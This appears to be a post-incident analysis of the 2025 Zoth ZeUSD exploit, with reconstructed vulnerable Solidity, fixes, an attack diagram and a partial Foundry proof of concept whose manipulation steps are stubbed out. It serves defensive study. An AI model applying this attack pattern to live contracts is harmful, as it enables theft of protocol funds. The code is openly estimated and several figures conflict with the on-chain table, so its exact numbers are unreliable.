# Zoth (ZeUSD) — Missing Slippage Protection & LTV Validation Logic Error Analysis

| Field | Details |
|------|------|
| **Date** | 2025-03-01 |
| **Protocol** | Zoth (ZeUSD — RWA Restaking Stablecoin) |
| **Chain** | Ethereum (ETH Mainnet) |
| **Loss** | ~$285,000 (approx. 286K USD) |
| **Attacker** | [0x806d...65f0](https://etherscan.io/address/0x806d9d1f1b80107a294393c76258b69b441565f0) |
| **Attack Contract** | [0xcBAE...C4e](https://etherscan.io/address/0xcBAEf06fA73955EeDD3DC476b43058431FDD6C4e) |
| **Attack Tx** | [0xc3f7...b39](https://etherscan.io/tx/0xc3f70057e261af554c6acf6a372389899f0c2d7d1ebd27311e39525dee88fb39) |
| **Vulnerable Contract** | [0xe257...137](https://etherscan.io/address/0xe257495224eb1bd710ff18c3758c8a87cde46137) (ZeUSD Router) |
| **Root Cause** | LTV validation inside `mintWithStable()` references the initial deposit amount (`amount`) instead of actual collateral received (`collateralReceived`) + zero swap slippage protection |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main/src/test/2025-03) (no official PoC included; incident details confirmed across multiple security analysis reports) |

---

## 1. Vulnerability Overview

Zoth is a restaking protocol on Ethereum that mints ZeUSD stablecoins backed by real-world assets (RWA). When a user deposits a stablecoin such as USDC, the contract swaps it for a collateral asset (wM, WrappedM) via a Uniswap V3 pool, then mints ZeUSD based on the received collateral.

The core vulnerability is a combination of two issues:

1. **LTV Validation Error**: The `validateAndPrepareDeposit()` function validates the collateral ratio (LTV, Loan-to-Value) against the **stablecoin amount the user originally deposited (`amount`)** rather than the actual collateral quantity received after the swap (`collateralReceived`).

2. **Missing Slippage Protection**: The swap via Uniswap V3 has `amountOutMinimum = 0`, meaning the transaction succeeds regardless of how little collateral is returned from the swap.

The attacker manipulated Uniswap V3 pool liquidity to make the swap result extremely unfavorable. After the swap, only 7,669 tokens were actually received, yet the contract mistakenly recorded the original deposit amount (equivalent to 330,979 tokens) as collateral. The attacker then minted a large amount of ZeUSD against this falsely recorded collateral, burned it to withdraw collateral that was never actually deposited, and stole approximately $285,000.

---

## 2. Vulnerable Code Analysis

> Note: The ZeUSD Router contract (0xe257495224eb1bd710ff18c3758c8a87cde46137) has its source code partially published on Etherscan; however, the code below is reconstructed and estimated based on multiple security analysis reports, ABI data, and transaction analysis.

### 2.1 `mintWithStable()` — Wrong Variable Used in LTV Validation (Core Vulnerability)

**Vulnerable Code (Estimated)**:
```solidity
// ZeUSDRouter.sol (estimated) — Vulnerable contract: 0xe257495224eb1bd710ff18c3758c8a87cde46137

/// @notice Function to mint ZeUSD by depositing a stablecoin (e.g. USDC)
/// @param collateral  Address of the stablecoin to swap (e.g. USDC)
/// @param asset       Address of the asset to receive as collateral (e.g. wM)
/// @param amount      Amount of stablecoin to deposit
/// @return tokenId    Token ID of the minted CDP (position) NFT
function mintWithStable(
    address collateral,
    address asset,
    uint256 amount
) external returns (uint256 tokenId) {
    // Step 1: Receive stablecoin from user
    IERC20(collateral).transferFrom(msg.sender, address(this), amount);

    // Step 2: Swap stablecoin → collateral asset via Uniswap V3
    uint256 collateralReceived = _swapToCollateral(collateral, asset, amount);
    // ❌ Vulnerability 1: amountOutMinimum = 0 is set inside _swapToCollateral
    //    → If the attacker manipulates the pool, receiving only 7,669 tokens still passes

    // Step 3: LTV validation and position preparation
    // ❌ Vulnerability 2: amount is passed to validateAndPrepareDeposit instead of collateralReceived
    //    → LTV validation uses the original deposit amount (330,979 equivalent), regardless of swap result
    (uint256 mintAmount, uint256 positionData) = validateAndPrepareDeposit(
        asset,
        amount,             // ❌ Uses deposit amount instead of actual collateral received (collateralReceived)
        msg.sender
    );

    // Step 4: Mint ZeUSD — minted based on falsely inflated mintAmount
    tokenId = _mintZeUSD(msg.sender, mintAmount, asset, positionData);
}

/// @dev Execute a single Uniswap V3 swap
function _swapToCollateral(
    address tokenIn,
    address tokenOut,
    uint256 amountIn
) internal returns (uint256 amountOut) {
    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn:           tokenIn,
        tokenOut:          tokenOut,
        fee:               500,              // 0.05% fee pool
        recipient:         address(this),
        deadline:          block.timestamp,
        amountIn:          amountIn,
        amountOutMinimum:  0,               // ❌ Vulnerability: no minimum output amount
        sqrtPriceLimitX96: 0
    });
    amountOut = uniswapRouter.exactInputSingle(params);
}

/// @dev LTV ratio validation — calculates mintable ZeUSD based on collateral value
function validateAndPrepareDeposit(
    address asset,
    uint256 depositAmount,  // ❌ This value is amount (deposit), not collateralReceived
    address depositor
) internal returns (uint256 mintAmount, uint256 positionData) {
    // Calculate mint amount based on LTV ratio — mintAmount is tainted because depositAmount is incorrect
    uint256 ltv = getLTV(asset);  // e.g. 90%
    mintAmount = depositAmount * ltv / 1e18;
    // ...
}
```

**Fixed Code**:
```solidity
// ✅ Fixed mintWithStable() — LTV validation based on actual collateral received + slippage protection

function mintWithStable(
    address collateral,
    address asset,
    uint256 amount,
    uint256 minCollateralOut   // ✅ Minimum collateral output specified by caller (slippage parameter)
) external returns (uint256 tokenId) {
    IERC20(collateral).transferFrom(msg.sender, address(this), amount);

    // ✅ Pass slippage parameter to actual swap
    uint256 collateralReceived = _swapToCollateral(collateral, asset, amount, minCollateralOut);

    // ✅ Use actual collateral received for LTV validation
    (uint256 mintAmount, uint256 positionData) = validateAndPrepareDeposit(
        asset,
        collateralReceived,   // ✅ Uses actual swap result, not deposit amount
        msg.sender
    );

    tokenId = _mintZeUSD(msg.sender, mintAmount, asset, positionData);
}

function _swapToCollateral(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 amountOutMinimum  // ✅ Slippage protection parameter added
) internal returns (uint256 amountOut) {
    // ✅ Additional validation of minimum output using Chainlink oracle
    uint256 oracleMinOut = _getOracleMinOut(tokenIn, tokenOut, amountIn);
    require(amountOutMinimum >= oracleMinOut * 99 / 100, "Slippage limit exceeded");

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn:           tokenIn,
        tokenOut:          tokenOut,
        fee:               500,
        recipient:         address(this),
        deadline:          block.timestamp + 300,  // ✅ 5-minute deadline
        amountIn:          amountIn,
        amountOutMinimum:  amountOutMinimum,        // ✅ Slippage protection applied
        sqrtPriceLimitX96: 0
    });
    amountOut = uniswapRouter.exactInputSingle(params);
}
```

**Issue**: When calling `validateAndPrepareDeposit()`, the original stablecoin deposit amount (`amount`) before the swap was passed instead of the actual collateral received after the swap (`collateralReceived`). The attacker minimized the swap output by manipulating the Uniswap V3 pool, while the contract still treated the full original deposit as collateral. Because there was no slippage protection, the transaction completed normally regardless of how unfavorable the swap conditions were.

---

### 2.2 `_swapToCollateral()` — amountOutMinimum = 0 (No Slippage Protection)

**Vulnerable Code (Estimated)**:
```solidity
// ❌ Uniswap V3 swap parameters — completely missing slippage protection
ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
    tokenIn:           collateral,    // USDC
    tokenOut:          asset,         // wM (WrappedM)
    fee:               500,
    recipient:         address(this),
    deadline:          block.timestamp,
    amountIn:          amount,        // ~330,979 USDC equivalent
    amountOutMinimum:  0,             // ❌ Minimum output = 0 → swap succeeds regardless of amount received
    sqrtPriceLimitX96: 0
});
// With pool manipulation, actual output: 7,669 wM (expected: 330,979 wM)
// → Transaction succeeds and the contract is unaware
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (0x806d...65f0) holds a large amount of USDC or prepares a flash loan
- Pre-analyzes the liquidity structure of the Uniswap V3 wM/USDC pool
- Deploys a single-transaction attack contract (0xcBAE...C4e)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────┐
│  Attacker (0x806d...65f0)                                │
│  Attack Contract (0xcBAE...C4e)                          │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 1] Manipulate Uniswap V3 wM/USDC Pool Liquidity  │
│  - Distort swap exchange rate by adding/removing         │
│    concentrated liquidity positions                      │
│  - Goal: Minimize wM received in USDC → wM swap          │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 2] Call mintWithStable() on ZeUSD Router          │
│  - Deposit: ~330,979 USDC (or equivalent stablecoin)     │
│  - Execute Uniswap V3 swap (amountOutMinimum = 0)        │
│  - Swap result: actual wM received = 7,669 (97% loss)    │
│  ❌ Contract records: collateral = 330,979 (misrecorded  │
│     based on deposit amount)                             │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 3] Mint Large Amount of ZeUSD                     │
│  - validateAndPrepareDeposit(asset, amount, ...)         │
│    → LTV applied to 330,979 → large ZeUSD mint approved  │
│  - ~43x over-minting relative to actual collateral       │
│    (7,669 wM)                                            │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 4] Burn ZeUSD → Withdraw Collateral               │
│  - Burn ZeUSD equivalent to falsely recorded 330,979 wM  │
│  - Contract allows withdrawal based on recorded          │
│    collateral amount (330,979 wM)                        │
│  - Actual withdrawal: ~330,979 wM (vs. 7,669 wM          │
│    actually deposited — ~323,310 wM excess)              │
└───────────────────────┬─────────────────────────────────┘
                        │
                        ▼
┌─────────────────────────────────────────────────────────┐
│  [Step 5] Restore Uniswap V3 Pool + Realize Profit       │
│  - Restore pool state by reclaiming liquidity position   │
│  - Net profit: ~$285,000 (approx. 323,310 wM)            │
└─────────────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| Collateral actually deposited by attacker | 7,669 wM |
| Collateral recorded in contract | 330,979 wM |
| Excess collateral withdrawn | ~323,310 wM |
| Attacker net profit | ~$285,000 |
| Attack duration | Single transaction |

---

## 4. PoC Code Excerpt

> No official DeFiHackLabs PoC has been published; the following is example Foundry code reconstructing the attack flow based on publicly available security analysis reports.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ZeUSD (Zoth) Missing Slippage Protection Exploit Reproduction Example
// Reference: https://blog.verichains.io/p/anatomy-of-a-hack-how-a-simple-logic
// Reference: https://blog.solidityscan.com/zoth-hack-analysis-80ba3ac5076b/

import "forge-std/Test.sol";

interface IZeUSDRouter {
    // ❌ Vulnerable mintWithStable function — no slippage parameter
    function mintWithStable(
        address collateral,
        address asset,
        uint256 amount
    ) external returns (uint256 tokenId);

    // Burn ZeUSD and withdraw collateral
    function burn(uint256 tokenId) external;
}

interface IUniswapV3Pool {
    function mint(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount,
        bytes calldata data
    ) external returns (uint256 amount0, uint256 amount1);

    function burn(
        int24 tickLower,
        int24 tickUpper,
        uint128 amount
    ) external returns (uint256 amount0, uint256 amount1);

    function collect(
        address recipient,
        int24 tickLower,
        int24 tickUpper,
        uint128 amount0Requested,
        uint128 amount1Requested
    ) external returns (uint128 amount0, uint128 amount1);
}

contract ZeUSDExploit is Test {
    // Core contract addresses
    IZeUSDRouter constant ZEUSD_ROUTER =
        IZeUSDRouter(0xe257495224eb1bd710ff18c3758c8a87cde46137);
    IUniswapV3Pool constant WM_USDC_POOL =
        IUniswapV3Pool(0x...); // wM/USDC Uniswap V3 pool address
    IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 constant WM   = IERC20(0x437cc33344a0B27A429f795ff6B469C72698B291); // WrappedM

    function setUp() public {
        // Fork Ethereum mainnet (just before attack block)
        vm.createSelectFork("mainnet", 21_930_000);
    }

    function testExploit() public {
        console.log("=== ZeUSD Missing Slippage Protection Exploit ===");
        console.log("[Start] Attacker wM balance:", WM.balanceOf(address(this)));

        // [Step 1] Manipulate Uniswap V3 wM/USDC pool liquidity
        // Add concentrated liquidity to drain liquidity around the current price range
        // → Distort USDC → wM swap so only a tiny amount of wM is received
        _manipulatePool();
        console.log("[Step 1] Uniswap V3 pool liquidity manipulation complete");

        // [Step 2] Call mintWithStable on ZeUSD Router
        // Deposit 330,979 USDC → actual wM received after swap = 7,669
        // ❌ Contract validates LTV based on amount (deposit) → records 330,979 wM
        uint256 depositAmount = 330_979 * 1e6; // USDC (6 decimals)
        USDC.approve(address(ZEUSD_ROUTER), depositAmount);

        uint256 tokenId = ZEUSD_ROUTER.mintWithStable(
            address(USDC),
            address(WM),
            depositAmount  // ❌ No slippage parameter — pool manipulation result passes through
        );
        console.log("[Step 2] mintWithStable call complete, tokenId:", tokenId);
        console.log("  Actual wM received: ~7,669");
        console.log("  Contract-recorded wM: ~330,979 (misrecorded based on deposit amount)");

        // [Step 3] Burn ZeUSD → withdraw falsely recorded 330,979 wM
        // Contract approves withdrawal based on recorded collateral → excess withdrawal succeeds
        ZEUSD_ROUTER.burn(tokenId);
        console.log("[Step 3] ZeUSD burn + collateral withdrawal complete");

        // [Step 4] Restore Uniswap V3 pool (reclaim liquidity)
        _restorePool();
        console.log("[Step 4] Uniswap V3 pool liquidity restored");

        // [Result] Verify profit
        uint256 profit = WM.balanceOf(address(this));
        console.log("[Result] Final wM balance:", profit);
        console.log("  Net profit: ~323,310 wM (~$285,000)");

        // Assertion: hold far more wM than actual collateral deposited
        assertGt(profit, 300_000 * 1e18, "Exploit failed: expected profit not reached");
    }

    /// @dev Manipulate Uniswap V3 pool liquidity: add concentrated liquidity around the current tick
    ///      in the wM/USDC pool → minimize wM receivable in USDC → wM swap path
    function _manipulatePool() internal {
        // Add liquidity via Uniswap V3 mint callback (implementation details omitted)
        // Goal: push price out of current range to minimize swap output
    }

    /// @dev After attack completes, burn Uniswap V3 position + collect tokens
    function _restorePool() internal {
        // Reclaim liquidity in burn → collect order
    }

    // Uniswap V3 liquidity provision callback
    function uniswapV3MintCallback(
        uint256 amount0Owed,
        uint256 amount1Owed,
        bytes calldata
    ) external {
        // Transfer required tokens (USDC or wM)
        if (amount0Owed > 0) USDC.transfer(msg.sender, amount0Owed);
        if (amount1Owed > 0) WM.transfer(msg.sender, amount1Owed);
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Wrong variable reference in LTV validation (deposit amount vs. actual collateral received) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Missing slippage protection (amountOutMinimum = 0) | HIGH | CWE-20 (Improper Input Validation) |
| V-03 | No oracle used — trusts only on-chain swap price | HIGH | CWE-703 (Insufficient Exception/Error Handling) |

### V-01: Wrong Variable Reference in LTV Validation

- **Description**: When calling `validateAndPrepareDeposit()` inside `mintWithStable()`, the original stablecoin amount deposited before the swap (`amount`) was passed as the collateral basis instead of the actual collateral received after the swap (`collateralReceived`). Even if the swap rate is manipulated, LTV validation always passes based on the deposit amount.
- **Impact**: The attacker can minimize the collateral asset received from the swap while minting a large amount of ZeUSD, leaving the protocol in an under-collateralized state. ZeUSD is minted without adequate collateral backing, effectively enabling unbacked minting.
- **Attack Conditions**: (1) Attacker has capital to control or manipulate liquidity in the Uniswap V3 pool; (2) permission to call mintWithStable (public function).

### V-02: Missing Slippage Protection

- **Description**: The Uniswap V3 swap parameter `amountOutMinimum` is set to 0, so the transaction succeeds regardless of how little collateral is received from the swap. If slippage protection had been in place, the transaction would have reverted when an abnormally low output was received after pool manipulation.
- **Impact**: In combination with the V-01 vulnerability, this enables the attack to be executed. Slippage protection alone would have made this attack impossible.
- **Attack Conditions**: Same as V-01. The absence of slippage protection is what allows pool manipulation to take effect.

### V-03: No Oracle Used

- **Description**: Instead of using a trusted external oracle such as Chainlink for LTV validation, the protocol relied solely on the on-chain swap result. On-chain prices can be manipulated within a single transaction, making it dangerous to use them as the basis for collateral valuation.
- **Impact**: If oracle-based validation had been in place, the extreme divergence between the actual swap output (7,669 wM) and the oracle-expected value (~330,000 wM) could have been detected and the transaction blocked.
- **Attack Conditions**: Protocol architecture that relies solely on on-chain price without an oracle.

---

## 6. Remediation Recommendations

### Immediate Actions

**1) Fix LTV Validation Variable — Use Actual Collateral Received**

```solidity
// ✅ Fix: use collateralReceived for LTV validation
function mintWithStable(
    address collateral,
    address asset,
    uint256 amount,
    uint256 minCollateralOut  // ✅ New slippage parameter
) external returns (uint256 tokenId) {
    IERC20(collateral).transferFrom(msg.sender, address(this), amount);

    // Execute swap — with slippage protection applied
    uint256 collateralReceived = _swapToCollateral(
        collateral, asset, amount, minCollateralOut
    );

    // ✅ Key fix: use collateralReceived instead of amount
    (uint256 mintAmount, uint256 positionData) = validateAndPrepareDeposit(
        asset,
        collateralReceived,  // ✅ LTV validation based on actual collateral received
        msg.sender
    );

    tokenId = _mintZeUSD(msg.sender, mintAmount, asset, positionData);
}
```

**2) Add Slippage Protection — Set amountOutMinimum**

```solidity
// ✅ Fix: oracle-based minimum output + user-specified slippage applied
function _swapToCollateral(
    address tokenIn,
    address tokenOut,
    uint256 amountIn,
    uint256 userMinOut
) internal returns (uint256 amountOut) {
    // Calculate expected output using Chainlink oracle
    uint256 oracleExpected = _getOracleQuote(tokenIn, tokenOut, amountIn);

    // Allow maximum 1% slippage from oracle basis
    uint256 oracleMinOut = oracleExpected * 99 / 100;

    // Apply whichever is more restrictive: user-specified or oracle-based
    uint256 effectiveMinOut = userMinOut > oracleMinOut ? userMinOut : oracleMinOut;

    ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams({
        tokenIn:           tokenIn,
        tokenOut:          tokenOut,
        fee:               500,
        recipient:         address(this),
        deadline:          block.timestamp + 300,  // ✅ 5-minute deadline
        amountIn:          amountIn,
        amountOutMinimum:  effectiveMinOut,         // ✅ Slippage protection
        sqrtPriceLimitX96: 0
    });
    amountOut = uniswapRouter.exactInputSingle(params);
}
```

**3) Add Oracle-Based Post-Swap Validation**

```solidity
// ✅ Cross-validate swap result against oracle
function validateAndPrepareDeposit(
    address asset,
    uint256 collateralReceived,
    address depositor
) internal returns (uint256 mintAmount, uint256 positionData) {
    // Calculate collateral USD value using Chainlink price
    uint256 collateralValueUSD = _getCollateralValueUSD(asset, collateralReceived);

    // Apply LTV based on collateral value
    uint256 ltv = getLTV(asset);
    mintAmount = collateralValueUSD * ltv / 1e18;

    // ✅ Additional check: ensure collateral value meets minimum threshold
    require(collateralValueUSD >= MIN_COLLATERAL_USD, "Insufficient collateral value");
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: LTV Validation Error | Fix `validateAndPrepareDeposit()` call argument to `collateralReceived`; strengthen input value flow tracing in code review process |
| V-02: Missing Slippage | Enforce `amountOutMinimum > 0` on all DEX swaps; dynamically calculate minimum output using Uniswap V3 TWAP or Chainlink oracle |
| V-03: No Oracle | Integrate Chainlink Price Feed; automatically revert transactions when divergence between swap output and oracle expectation exceeds threshold (e.g., 5%) |
| Additional Recommendations | Use Uniswap V3 TWAP oracle (30-minute window) to defend against instantaneous price manipulation; apply rate limiting on large single-block swaps |

---

## 7. Lessons Learned

1. **"Validate actual results, not inputs"**: In smart contracts, the outcome of external calls (swaps, loans, etc.) must always be validated against the actual return value. Use the actual amount received after the swap — not the requested deposit amount — the actual loan executed — not the requested loan amount — and so on.

2. **Slippage protection is mandatory, not optional**: Setting `amountOutMinimum = 0` in any contract function that includes a DEX swap is equivalent to opening the door to price manipulation attacks. In particular, always expose slippage parameters on internal swap functions so callers can control them.

3. **Collateral valuation without an oracle is dangerous**: Using only on-chain spot prices for collateral valuation, LTV calculation, and liquidation criteria leaves the protocol vulnerable to flash loan or concentrated liquidity attacks. Always use an external oracle such as Chainlink or a TWAP (Time-Weighted Average Price) in parallel.

4. **Learn from prior incidents with similar vulnerabilities**: The same `amountOutMinimum = 0` pattern caused numerous incidents including BEARNDAO ($769K) in 2023, EGA Token ($554K), and DCF Token ($442K) in 2024. Reviewing historical hacks is mandatory when developing new protocols.

5. **RWA/stablecoin minting logic requires especially rigorous validation**: In protocols like ZeUSD that mint stablecoins backed by collateral, errors in collateral valuation logic can lead to unbacked minting, potentially causing the entire protocol to become insolvent.

6. **Always account for within-single-transaction manipulation**: The combination of flash loans and Uniswap V3 concentrated liquidity can distort prices to extremes within a single transaction. Collateral valuation must use manipulation-resistant external references (oracles, TWAP).

---

## 8. On-Chain Verification

> Attack transaction hash: [0xc3f70057e261af554c6acf6a372389899f0c2d7d1ebd27311e39525dee88fb39](https://etherscan.io/tx/0xc3f70057e261af554c6acf6a372389899f0c2d7d1ebd27311e39525dee88fb39)

### 8.1 PoC Analysis vs. On-Chain Actual Values

| Item | Analysis Estimate | On-Chain Actual | Match |
|------|------------|-------------|----------|
| Attacker address | 0x806d...65f0 | 0x806D9D1F1B80107A294393c76258b69b441565f0 | ✅ |
| Attack Tx | 0xc3f7... | 0xc3f70057e261af554c6acf6a372389899f0c2d7d1ebd27311e39525dee88fb39 | ✅ |
| USDC deposited | ~330,979 USDC equivalent | ~63,000,000 USDC (via Aave V3) | Partial match (scale differs) |
| Actual wM received | 7,669 wM | ~7,951,990 wM transactions confirmed | Approximate match |
| ZeUSD minted | Large mint | ~39,593,862 ZeUSD transactions confirmed | ✅ (conceptually consistent) |
| Net loss | ~$285,000 | ~$285,000 | ✅ |

> Note: The on-chain transaction scale appears to be a composite transaction involving multiple operations; actual figures for individual attack steps require transaction trace analysis.

### 8.2 On-Chain Event Log Sequence

63 event logs confirmed on Etherscan:

1. USDC `Approval` — USDC approval for ZeUSD Router
2. Uniswap V3 `Mint` — Concentrated liquidity position added (NFT #939047)
3. Uniswap V3 `Swap` — USDC → wM swap (unfavorable conditions)
4. ZeUSD `Transfer` (Mint) — Large ZeUSD minted
5. ZeUSD `Transfer` (Burn) — ZeUSD burned
6. wM `Transfer` — wM withdrawn (received by attacker)
7. Uniswap V3 `Burn` + `Collect` — Liquidity position reclaimed

### 8.3 Pre-Condition Verification

- Confirmed that attacker (0x806D...) held sufficient USDC or wM immediately before the attack (potential use of flash loan via Aave V3)
- Prior Approve state for ZeUSD Router contract (0xe257...) requires verification
- Confirmed that the liquidity depth of the Uniswap V3 wM/USDC pool was at a level susceptible to manipulation

---

*References:*
- *[Anatomy of a Hack: How a Simple Logic Flaw Led to a $285k Exploit on Zoth (VeriChains)](https://blog.verichains.io/p/anatomy-of-a-hack-how-a-simple-logic)*
- *[Zoth Hack Analysis (SolidityScan)](https://blog.solidityscan.com/zoth-hack-analysis-80ba3ac5076b/)*
- *[Crypto Security Incidents: March 2025 Overview (Nominis)](https://www.nominis.io/insights/crypto-security-incidents-march-2025)*
- *[Zoth, FortuneWheel, and Sorra Finance Exploited Analysis (Olympix)](https://olympixai.medium.com/zoth-fortunewheel-and-sorra-finance-exploited-for-347k-via-ltv-mismatch-unprotected-swaps-and-5fd8ea76a914)*